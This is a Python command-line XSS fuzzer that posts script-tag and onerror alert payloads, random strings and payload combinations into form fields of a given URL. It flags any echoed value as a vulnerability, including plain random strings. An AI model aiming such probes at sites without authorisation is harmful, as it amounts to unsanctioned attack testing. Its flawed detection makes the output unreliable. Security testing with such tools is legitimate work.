import requests
import string
import random
import argparse

# Define the argument parser
parser = argparse.ArgumentParser(description='Fuzz websites for XSS vulnerabilities')
parser.add_argument('url', help='Target URL')
parser.add_argument('-f', '--fields', nargs='+', default=['search', 'query'], help='Input fields to fuzz')
parser.add_argument('-v', '--values', nargs='+', default=['<script>alert("XSS")</script>', '<img src="x" onerror="alert(\'XSS\')">'], help='Values to use for fuzzing')
parser.add_argument('-c', '--characters', default=string.ascii_letters + string.digits + '-_', help='Characters to use for fuzzing')
args = parser.parse_args()

# Define the target URL
url = args.url

# Define the input fields to fuzz
fields = args.fields

# Define a set of characters to use for fuzzing
characters = args.characters

# Define a list of values to use for fuzzing
values = args.values

# Define a function to generate random values
def generate_random_value(length=10):
    return ''.join(random.choice(characters) for i in range(length))

# Loop over the input fields and fuzz them with different techniques
for field in fields:
    # Fuzz with the predefined values
    for value in values:
        data = {field: value}
        response = requests.post(url, data=data)
        if value in response.text:
            print('XSS Vulnerability Detected!')
            print('Field:', field)
            print('Value:', value)

    # Fuzz with random values
    for i in range(10):
        value = generate_random_value()
        data = {field: value}
        response = requests.post(url, data=data)
        if value in response.text:
            print('XSS Vulnerability Detected!')
            print('Field:', field)
            print('Value:', value)

    # Fuzz with combinations of values
    for value1 in values:
        for value2 in values:
            value = f'{value1}{value2}'
            data = {field: value}
            response = requests.post(url, data=data)
            if value in response.text:
                print('XSS Vulnerability Detected!')
                print('Field:', field)
                print('Value:', value)

# Finished
